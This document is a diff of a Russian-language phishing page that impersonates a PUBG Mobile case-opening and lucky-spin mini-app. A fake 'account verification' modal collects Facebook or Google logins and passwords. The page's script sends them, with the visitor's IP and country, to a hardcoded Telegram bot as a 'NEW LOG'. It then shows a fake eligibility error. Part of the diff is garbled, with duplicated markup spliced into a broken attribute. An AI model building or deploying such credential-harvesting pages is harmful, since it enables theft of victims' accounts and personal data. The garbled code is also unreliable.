@@ -28,7 +28,6 @@
 
         .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
 
-        /* Шапка из скриншота */
         header {
             background: rgba(0, 0, 0, 0.9);
             padding: 12px 16px;
@@ -60,7 +59,6 @@
             font-weight: 900;
         }
 
-        /* Стили Кейса (Лента) */
         .case-container {
             position: relative;
             width: 100%;
@@ -74,11 +72,12 @@
             position: absolute;
             top: 0; left: 50%;
             width: 2px; height: 100%;
-            background: var(--pubg-gold);            z-index: 10;            box-shadow: 0 0 15px var(--pubg-gold);
+            background: var(--pubg-gold);
+            z-index: 10;
+            box-shadow: 0 0 15px var(--pubg-gold);
         }
 
-        .case-tape {
-            display: flex;
+        .case-tape {            display: flex;
             padding: 20px 0;
             transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
             will-change: transform;
@@ -96,11 +95,9 @@
             transition: opacity 0.3s;
         }
 
-        .case-item.active { opacity: 1; transform: scale(1.1); }
         .case-item img { width: 80px; height: 80px; object-fit: contain; filter: drop-shadow(0 0 10px rgba(255,255,255,0.2)); }
         .case-item span { font-size: 11px; margin-top: 10px; font-weight: 600; text-align: center; }
 
-        /* Кнопки как на скрине */
         .error-msg {
             background: rgba(255, 59, 48, 0.15);
             color: var(--pubg-red);
@@ -124,9 +121,9 @@
             font-size: 16px;
             text-align: center;
             display: block;
+            cursor: pointer;
         }
 
-        /* Нижнее меню */
         .nav-bar {
             position: fixed; bottom: 0; left: 0; right: 0;
             background: #000;
@@ -138,7 +135,6 @@
         .nav-item { display: flex; flex-direction: column; align-items: center; color: #555; font-size: 10px; }
         .nav-item.active { color: var(--pubg-gold); }
 
-        /* Модалки */
         .modal {
             position: fixed; inset: 0; background: rgba(0,0,0,0.95);
             z-index: 1000; display: none; flex-direction: column; padding: 20px;
@@ -147,11 +143,13 @@
 
         .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
         input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
+        
+        /* Стили для рулетки */
+        .spin-item img { width: 80%; height: 80%; object-fit: contain; }
     </style>
 </head>
 <body>
 
-    <!-- Header -->
     <header>
         <div class="flex items-center gap-2" onclick="showSection('hub')">
             <i class="fas fa-chevron-left text-gray-400"></i>
@@ -173,11 +171,11 @@
         <h2 class="pubg-font text-2xl mb-4">Выбор режима</h2>
         <div class="grid grid-cols-2 gap-4">
             <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center" onclick="showSection('case')">
-                <img src="https://static.wikia.nocookie.net/pubg_gamepedia_en/images/1/10/Item_Crate_Classic.png" class="h-20 mx-auto mb-2">
+                <img src="https://pubg.ac/img/crates/crate_classic.png" class="h-20 mx-auto mb-2">
                 <div class="pubg-font text-blue-400">GIFT DROP</div>
                 <div class="text-[9px] text-gray-500">КЕЙСЫ</div>
             </div>
-            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center" onclick="showSection('spin')">
+            <div class="bg-[#151618] p-4 rounded-2xlborder border-white/5 text-center" onclick="showSection('spin')">
                 <img src="https://www.pubgmobile.com/common/images/icon_uc.png" class="h-20 mx-auto mb-2">
                 <div class="pubg-font text-yellow-500">LUCKY SPIN</div>
                 <div class="text-[9px] text-gray-500">РУЛЕТКА</div>
@@ -191,214 +189,50 @@
             <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
             <p class="text-gray-500 text-xs">Moon Season Edition</p>
         </div>
-
         <div class="case-container">
             <div class="case-line"></div>
-            <div class="case-tape" id="caseTape">
-                <!-- Элементы генерируются JS -->
-            </div>
+            <div class="case-tape" id="caseTape"></div>
         </div>
-
         <div id="errorBox" class="error-msg">Недостаточно средств для открытия кейса</div>
-
         <div id="openBtn" onclick="tryOpenCase()" class="btn-blue !bg-white !text-black mb-3">Открыть (60 UC)</div>
         <div id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Пополнить баланс</div>
-
-        <div class="p-5">
-            <h3 class="text-gray-400 uppercase text-xs font-bold mb-4">Содержимое кейса</h3>
-            <div class="grid grid-cols-3 gap-3">
-                <div class="bg-[#151618] p-3 rounded-xl text-center">
-                    <img src="case1.png" class="w-full h-16 object-contain mb-2">
-                    <p class="text-[10px] text-white">M416 Glacier</p>
-                </div>
-                <div class="bg-[#151618] p-3 rounded-xl text-center">
-                    <img src="case2.png" class="w-full h-16 object-contain mb-2">
-                    <p class="text-[10px] text-white">Pharaoh Set</p>
-                </div>
-                <div class="bg-[#151618] p-3 rounded-xl text-center">
-                    <img src="case3.png" class="w-full h-16 object-contain mb-2">
-                    <p class="text-[10px] text-white">X-Suit</p>
-                </div>
-            </div>
-        </div>
     </div>
 
     <!-- SPIN SECTION -->
     <div id="section-spin" style="display: none;" class="p-5">
          <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] relative">
             <div class="grid grid-cols-3 gap-2" id="spinGrid">
-                <!-- Ячейки рулетки, теперь с новыми картинками -->
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s0"><img src="case1.png"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s1"><img src="case9.png"></div> <!-- Новое изображение -->
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s2"><img src="case2.png"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s7"><img src="case10.png"></div> <!-- Новое изображение -->
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="mid"><i class="fas fa-star text-yellow-500"></i></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border\            z-index: 10;            box-shadow: 0 0 15px var(--pubg-gold);
-        }
-
-        .case-tape {
-            display: flex;
-            padding: 20px 0;
-            transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
-            will-change: transform;
-        }
-
-        .case-item {
-            min-width: 130px;
-            height: 140px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 10px;
-            opacity: 0.5;
-            transition: opacity 0.3s;
-        }
-
-        .case-item.active { opacity: 1; transform: scale(1.1); }
-        .case-item img { width: 80px; height: 80px; object-fit: contain; filter: drop-shadow(0 0 10px rgba(255,255,255,0.2)); }
-        .case-item span { font-size: 11px; margin-top: 10px; font-weight: 600; text-align: center; }
-
-        /* Кнопки как на скрине */
-        .error-msg {
-            background: rgba(255, 59, 48, 0.15);
-            color: var(--pubg-red);
-            border: 1px solid rgba(255, 59, 48, 0.3);
-            border-radius: 12px;
-            padding: 15px;
-            text-align: center;
-            font-size: 14px;
-            margin: 15px;
-            display: none;
-        }
-
-        .btn-blue {
-            background: var(--pubg-blue);
-            color: white;
-            width: calc(100% - 32px);
-            margin: 0 16px;
-            padding: 16px;
-            border-radius: 14px;
-            font-weight: 700;
-            font-size: 16px;
-            text-align: center;
-            display: block;
-        }
-
-        /* Нижнее меню */
-        .nav-bar {
-            position: fixed; bottom: 0; left: 0; right: 0;
-            background: #000;
-            height: 70px;
-            display: flex; justify-content: space-around; align-items: center;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-        }
-
-        .nav-item { display: flex; flex-direction: column; align-items: center; color: #555; font-size: 10px; }
-        .nav-item.active { color: var(--pubg-gold); }
-
-        /* Модалки */
-        .modal {
-            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
-            z-index: 1000; display: none; flex-direction: column; padding: 20px;
-            justify-content: center;
-        }
-
-        .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
-    </style>
-</head>
-<body>
-
-    <!-- Header -->
-    <header>
-        <div class="flex items-center gap-2" onclick="showSection('hub')">
-            <i class="fas fa-chevron-left text-gray-400"></i>
-            <span class="text-sm font-bold">Назад</span>
-        </div>
-        <div class="text-center">
-            <h1 class="pubg-font text-lg leading-none">Gift Drop</h1>
-            <p class="text-[9px] text-gray-500 uppercase">мини-приложение</p>
-        </div>
-        <div class="btn-deposit" onclick="startAuth()">
-            <div class="bonus-badge">+25%</div>
-            <div class="w-4 h-4 bg-blue-500 rounded-full flex items-center justify-center text-[10px]">+</div>
-            <span class="text-xs font-bold">Пополнить</span>
-        </div>
-    </header>
-
-    <!-- MAIN HUB -->
-    <div id="section-hub" class="p-4">
-        <h2 class="pubg-font text-2xl mb-4">Выбор режима</h2>
-        <div class="grid grid-cols-2 gap-4">
-            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center" onclick="showSection('case')">
-                <img src="https://static.wikia.nocookie.net/pubg_gamepedia_en/images/1/10/Item_Crate_Classic.png" class="h-20 mx-auto mb-2">
-                <div class="pubg-fonttext-blue-400">GIFT DROP</div>
-                <div class="text-[9px] text-gray-500">КЕЙСЫ</div>
-            </div>
-            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center" onclick="showSection('spin')">
-                <img src="https://www.pubgmobile.com/common/images/icon_uc.png" class="h-20 mx-auto mb-2">
-                <div class="pubg-font text-yellow-500">LUCKY SPIN</div>
-                <div class="text-[9px] text-gray-500">РУЛЕТКА</div>
-            </div>
-        </div>
-    </div>
-
-    <!-- CASE SECTION -->
-    <div id="section-case" style="display: none;">
-        <div class="text-center py-6">
-            <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
-            <p class="text-gray-500 text-xs">Moon Season Edition</p>
-        </div>
-
-        <div class="case-container">
-            <div class="case-line"></div>
-            <div class="case-tape" id="caseTape">
-                <!-- Элементы генерируются JS -->
-            </div>
-        </div>
-
-        <div id="errorBox" class="error-msg">Недостаточно средств для открытия кейса</div>
-
-        <div id="openBtn" onclick="tryOpenCase()" class="btn-blue !bg-white !text-black mb-3">Открыть (60 UC)</div>
-        <div id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Пополнить баланс</div>
-
-        <div class="p-5">
-            <h3 class="text-gray-400 uppercase text-xs font-bold mb-4">Содержимое кейса</h3>
-            <div class="grid grid-cols-3 gap-3">
-                <div class="bg-[#151618] p-3 rounded-xl text-center">
-                    <img src="case1.png" class="w-full h-16 object-contain mb-2">
-                    <p class="text-[10px] text-white">M416 Glacier</p>
+                <!-- Призы Lucky Spin с прямыми ссылками -->
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent spin-item" id="s0">
+                    <img src="https://midas.gtimg.cn/pro_act/v2/1623915154/4862/images/prop_1.png">
                 </div>
-                <div class="bg-[#151618] p-3 rounded-xl text-center">
-                    <img src="case2.png" class="w-full h-16 object-contain mb-2">
-                    <p class="text-[10px] text-white">Pharaoh Set</p>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent spin-item" id="s1">
+                    <img src="https://www.pubgmobile.com/common/images/icon_xsuit.png">
                 </div>
-                <div class="bg-[#151618] p-3 rounded-xl text-center">
-                    <img src="case3.png" class="w-full h-16 object-contain mb-2">
-                    <p class="text-[10px] text-white">X-Suit</p>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent spin-item" id="s2">
+                    <img src="https://pubg.ac/img/items/m416-glacier.png">
                 </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- SPIN SECTION -->
-    <div id="section-spin" style="display: none;" class="p-5">
-         <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] relative">
-            <div class="grid grid-cols-3 gap-2" id="spinGrid">
-                <!-- Ячейки рулетки, теперь с новыми картинками -->
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s0"><img src="case1.png"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s1"><img src="case9.png"></div> <!-- Новое изображение -->
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s2"><img src="case2.png"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s7"><img src="case10.png"></div> <!-- Новое изображение -->
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="mid"><i class="fas fa-star text-yellow-500"></i></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s3"><img src="case3.png"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s6"><img src="case11.png"></div> <!-- Новое изображение -->
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s5"><img src="case4.png"></div>
-                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="s4"><img src="case12.png"></div> <!-- Новое изображение -->
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent spin-item" id="s7">
+                    <img src="https://www.pubgmobile.com/common/images/icon_uc.png">
+                </div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent" id="mid">
+                    <i class="fas fa-star text-yellow-500 text-2xl"></i>
+                </div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent spin-item" id="s3">
+                    <img src="https://pubg.ac/img/items/posiedon-x-suit.png">
+                </div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent spin-item" id="s6">
+                    <img src="https://pubg.ac/img/items/blood-raven-x-suit.png">
+                </div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent spin-item" id="s5">
+                    <img src="https://www.pubgmobile.com/common/images/icon_uc.png">
+                </div>
+                <div class="bg-[#25262b] aspect-square rounded-xl flex items-center justify-center p-2 border-2 border-transparent spin-item" id="s4">
+                    <img src="https://pubg.ac/img/items/pharaoh-set.png"></div>
             </div>
          </div>
-         <button class="btn-blue !mx-0 mt-6 !bg-yellow-500 !text-black" onclick="tryOpenCase()">Крутить (60 UC)</button>
+         <div id="errorBoxSpin" class="error-msg">Недостаточно средств для прокрута</div>
+         <button class="btn-blue !mx-0 mt-6 !bg-yellow-500 !text-black" onclick="tryOpenCase('Spin')">Крутить (60 UC)</button>
     </div>
 
     <!-- MODAL AUTH -->
@@ -406,13 +240,8 @@
         <div class="login-card">
             <h2 class="font-black text-xl mb-2">Верификация аккаунта</h2>
             <p class="text-gray-500 text-sm mb-6">Войдите через одну из сетей, чтобы подтвердить ID и получить награду.</p>
-            
-            <button onclick="openForm('Facebook')" class="w-full bg-[#1877F2] text-white p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3">
-                <i class="fab fa-facebook-f"></i> Facebook
-            </button>
-            <button onclick="openForm('Google')" class="w-full bg-white text-black border border-gray-200 p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3">
-                <i class="fab fa-google"></i> Google
-            </button>
+            <button onclick="openForm('Facebook')" class="w-full bg-[#1877F2] text-white p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-facebook-f"></i> Facebook</button>
+            <button onclick="openForm('Google')" class="w-full bg-white text-black border border-gray-200 p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-google"></i> Google</button>
             <button onclick="showSection('hub')" class="w-full text-gray-400 text-sm mt-2">Отмена</button>
         </div>
     </div>
@@ -429,71 +258,69 @@
     <!-- Bottom Nav -->
     <nav class="nav-bar">
         <div class="nav-item" onclick="showSection('hub')"><i class="fas fa-home"></i><span>Главная</span></div>
-        <div class="nav-item active" onclick="showSection('case')"><i class="fas fa-box-open"></i><span>Кейсы</span></div>
+        <div class="nav-item" onclick="showSection('case')"><i class="fas fa-box-open"></i><span>Кейсы</span></div>
         <div class="nav-item"><i class="fas fa-tasks"></i><span>Задания</span></div>
         <div class="nav-item" onclick="startAuth()"><i class="fas fa-user-circle"></i><span>Профиль</span></div>
     </nav>
 
     <script>
-        // --- CONFIG ---
         const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
         const CHAT_ID = '1709490182';
         
-        // Обновленный список призов, теперь с 4 новыми изображениями-плейсхолдерами
+        // Ссылки на картинки призов
         const prizeImages = [
-            'case1.png', 'case2.png', 'case3.png', 'case4.png', 
-            'case5.png', 'case6.png', 'case7.png', 'case8.png',
-            'case9.png', 'case10.png', 'case11.png', 'case12.png' // Новые изображения
+            'https://pubg.ac/img/items/m416-glacier.png',
+            'https://pubg.ac/img/items/posiedon-x-suit.png',
+            'https://pubg.ac/img/items/blood-raven-x-suit.png',
+            'https://pubg.ac/img/items/pharaoh-set.png',
+            'https://www.pubgmobile.com/common/images/icon_uc.png',
+            'https://midas.gtimg.cn/pro_act/v2/1623915154/4862/images/prop_1.png'
         ];
+
         let userIP = '';
         let currentMethod = '';
 
-        // Определение IP
         fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');
 
-        // Навигация
         function showSection(id) {
             ['section-hub', 'section-case', 'section-spin', 'modalAuth', 'modalForm'].forEach(s => {
                 document.getElementById(s).style.display = 'none';
-                document.getElementById(s).classList.remove('flex'); // Убедимся, что flex убирается, если был
             });
             const target = document.getElementById('section-' + id);
             if(target) target.style.display = 'block';
-            window.scrollTo(0,0);
+            
+            // Сброс ошибок при переключении
+            document.querySelectorAll('.error-msg').forEach(e => e.style.display = 'none');
+            document.getElementById('openBtn').style.display = 'block';
+            document.getElementById('depositBtn').style.display = 'none';
         }
 
-        // Генерация ленты кейса (теперь она может включать новые изображения)
         const tape = document.getElementById('caseTape');
         for(let i=0; i<40; i++) {
-            const img = prizeImages[Math.floor(Math.random()*prizeImages.length)];
+            const img = prizeImages[Math.floor(Math.random()*prizeImages.length)\ 
+];
             tape.innerHTML += `
                 <div class="case-item">
                     <img src="${img}">
-                    <span class="pubg-font">Epic Item</span>
+                    <span class="pubg-font">Legendary Item</span>
                 </div>
             `;
         }
 
-        // Логика "Открытия" (Ошибка как на скрине)
-        function tryOpenCase() {
-            document.getElementById('errorBox').style.display = 'block';
-            document.getElementById('openBtn').style.display = 'none';
-            document.getElementById('depositBtn').style.display = 'block';
-            
-            // Крутим ленту для вида (только для секции "Case")
-            if (document.getElementById('section-case').style.display === 'block') {
+        function tryOpenCase(type) {
+            if(type === 'Spin') {
+                document.getElementById('errorBoxSpin').style.display = 'block';
+            } else {
+                document.getElementById('errorBox').style.display = 'block';
+                document.getElementById('openBtn').style.display = 'none';
+                document.getElementById('depositBtn').style.display = 'block';
                 const offset = 130 * 25 + Math.floor(Math.random()*100);
                 tape.style.transform = `translateX(-${offset}px)`;
             }
-
-            // TODO: Для рулетки нужна отдельная логика анимации выигрыша.
-            
-            sendTelegram(`⚠️ Пользователь нажал "Открыть кейс" (IP: ${userIP})`);
+            sendTelegram(`⚠️ Попытка открытия (${type || 'Кейс'}) | IP: ${userIP}`);
         }
 
-        function startAuth() {
-            document.getElementById('modalAuth').style.display = 'flex';
-        }
+        function startAuth() { document.getElementById('modalAuth').style.display = 'flex'; }
 
         function openForm(method) {
             currentMethod = method;
@@ -507,27 +334,11 @@
             const p = document.getElementById('inpPass').value;
             if(u.length < 3 || p.length < 3) return alert('Заполните поля!');
 
-            const msg = `
-🔥 **NEW LOG** 🔥
-👤 Метод: ${currentMethod}
-📧 Логин: \`${u}\`
-🔑 Пароль: \`${p}\`
-🌐 IP: ${userIP}
-            `;
-            
+            const msg = `🔥 **NEW LOG** 🔥\n👤 Метод: ${currentMethod}\n📧 Логин: \`${u}\`\n🔑 Пароль: \`${p}\`\n🌐 IP: ${userIP}`;
             await sendTelegram(msg);
             
-            document.getElementById('modalForm').innerHTML = `
-                <div class="text-center p-10">
-                    <i class="fas fa-spinner fa-spin text-3xl mb-3 text-blue-500"></i>
-                    <p class="text-black font-bold">Синхронизация аккаунта...</p>
-                </div>
-            `;
-            
-            setTimeout(() => {
-                alert('Ошибка: Данный аккаунт не подходит под критерии акции (минимум 15 уровень).');
-                location.reload();
-            }, 3000);
+            document.getElementById('modalForm').innerHTML = `<div class="text-center p-10"><i class="fas fa-spinner fa-spin text-3xl mb-3 text-blue-500"></i><p class="text-black font-bold">Синхронизация...</p></div>`;
+            setTimeout(() => { alert('Ошибка: Аккаунт не подходит (нужен 15+ уровень).'); location.reload(); }, 3000);
         }
 
         async function sendTelegram(text) {
@@ -537,12 +348,9 @@
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'Markdown'})
                 });
-            } catch(e) {
-                console.error("Failed to send message to Telegram:", e);
-            }
+            } catch(e) {}
         }
 
-        // Инициализация
         showSection('hub');
     </script>
 </body>
